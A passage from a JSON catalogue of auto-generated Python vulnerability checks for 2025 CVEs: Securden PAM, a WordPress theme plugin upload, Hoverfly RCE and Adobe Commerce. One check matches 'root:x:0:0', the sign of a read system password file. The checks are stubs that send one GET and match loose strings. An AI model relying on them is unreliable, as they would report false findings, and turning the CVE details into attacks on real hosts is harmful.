urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code == 302 / [OR] DSL: status_code == 200; contains(body, 'token') / [OR] DSL: status_code == 200; contains(body, 'current_date')\"\n\n        # Simple word matcher simulation\n        matchers = ['token', 'current_date']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Securden Unified PAM - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_53118(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "securden",
          "pam",
          "auth-bypass",
          "vuln",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_5394",
        "name": "Unauthenticated Arbitrary Plugin Upload in Alone Theme",
        "language": "Python",
        "famille": "CVE",
        "description": "The Alone – Charity Multipurpose Non-profit WordPress Theme theme for WordPress is vulnerable to arbitrary file uploads due to a missing capability check on the alone_import_pack_install_plugin() function in all versions up to, and including, 7.8.3.",
        "severity": "critical",
        "detection": "[OR] DSL: contains_all(body, '\\\"success\\\":true','\\\"substep\\\":\\\"activate\\\"'); contains(content_type, 'application/json')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-5394\nName: Unauthenticated Arbitrary Plugin Upload in Alone Theme\nSeverity: critical\nDescription: The Alone – Charity Multipurpose Non-profit WordPress Theme theme for WordPress is vulnerable to arbitrary file uploads due to a missing capability check on the alone_import_pack_install_plugin() function in all versions up to, and including, 7.8.3.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_5394:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-5394\"\n    SEVERITY = \"critical\"\n    NAME = \"Unauthenticated Arbitrary Plugin Upload in Alone Theme\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains_all(body, \\'\\\\\"success\\\\\":true\\',\\'\\\\\"substep\\\\\":\\\\\"activate\\\\\"\\'); contains(content_type, \\'application/json\\')'\n\n        # Simple word matcher simulation\n        matchers = ['\\\\\"success\\\\\":true', '\\\\\"substep\\\\\":\\\\\"activate\\\\\"', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Unauthenticated Arbitrary Plugin Upload in Alone Theme\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_5394(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-5394\nName: Unauthenticated Arbitrary Plugin Upload in Alone Theme\nSeverity: critical\nDescription: The Alone – Charity Multipurpose Non-profit WordPress Theme theme for WordPress is vulnerable to arbitrary file uploads due to a missing capability check on the alone_import_pack_install_plugin() function in all versions up to, and including, 7.8.3.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_5394:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-5394\"\n    SEVERITY = \"critical\"\n    NAME = \"Unauthenticated Arbitrary Plugin Upload in Alone Theme\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains_all(body, \\'\\\\\"success\\\\\":true\\',\\'\\\\\"substep\\\\\":\\\\\"activate\\\\\"\\'); contains(content_type, \\'application/json\\')'\n\n        # Simple word matcher simulation\n        matchers = ['\\\\\"success\\\\\":true', '\\\\\"substep\\\\\":\\\\\"activate\\\\\"', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Unauthenticated Arbitrary Plugin Upload in Alone Theme\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_5394(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "unauth",
          "file-upload",
          "rce",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_54123",
        "name": "Hoverfly <= 1.11.3 - Remote Code Execution",
        "language": "Python",
        "famille": "CVE",
        "description": "Hoverfly versions 1.11.3 and below are vulnerable to remote code execution (RCE) via command injection in the middleware API endpoint (/api/v2/hoverfly/middleware). Insufficient validation of the 'binary' and 'script' parameters allows an unauthenticated attacker to execute arbitrary commands on the host system.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 422; regex('root:x:0:0', body)",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-54123\nName: Hoverfly <= 1.11.3 - Remote Code Execution\nSeverity: critical\nDescription: Hoverfly versions 1.11.3 and below are vulnerable to remote code execution (RCE) via command injection in the middleware API endpoint (/api/v2/hoverfly/middleware). Insufficient validation of the 'binary' and 'script' parameters allows an unauthenticated attacker to execute arbitrary commands on the host system.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_54123:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-54123\"\n    SEVERITY = \"critical\"\n    NAME = \"Hoverfly <= 1.11.3 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code == 422; regex('root:x:0:0', body)\"\n\n        # Simple word matcher simulation\n        matchers = ['root:x:0:0']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Hoverfly <= 1.11.3 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_54123(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-54123\nName: Hoverfly <= 1.11.3 - Remote Code Execution\nSeverity: critical\nDescription: Hoverfly versions 1.11.3 and below are vulnerable to remote code execution (RCE) via command injection in the middleware API endpoint (/api/v2/hoverfly/middleware). Insufficient validation of the 'binary' and 'script' parameters allows an unauthenticated attacker to execute arbitrary commands on the host system.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_54123:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-54123\"\n    SEVERITY = \"critical\"\n    NAME = \"Hoverfly <= 1.11.3 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code == 422; regex('root:x:0:0', body)\"\n\n        # Simple word matcher simulation\n        matchers = ['root:x:0:0']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Hoverfly <= 1.11.3 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_54123(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "hoverfly",
          "rce",
          "intrusive",
          "vuln",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_54236",
        "name": "Adobe Commerce - Authentication Bypass",
        "language": "Python",
        "famille": "CVE",
        "description": "Adobe Commerce versions 2.4.9-alpha2, 2.4.8-p2, 2.4.7-p7, 2.4.6-p12, 2.4.5-p14, 2.4.4-p15 and earlier are affected by an Improper Input Validation vulnerability. A successful attacker can abuse this to achieve session takeover, increasing the confidentiality, and integrity impact to high. Exploitation of this issue does not require user interaction.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; contains(content_type, \"application/json\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "root_url",
            "datatype": "string",
            "required": false,
            "description": "URL racine sans chemin"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "form_key",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: form_key",
            "default": "{{rand_text_alphanumeric(16)}}"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{to_lower(rand_text_alpha(5))}}"
          },
          {
            "name": "marker",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: marker",
            "default": "{{randstr}}"
          },
          {
            "name": "base64",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: base64",
            "default": "{{base64(filename)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
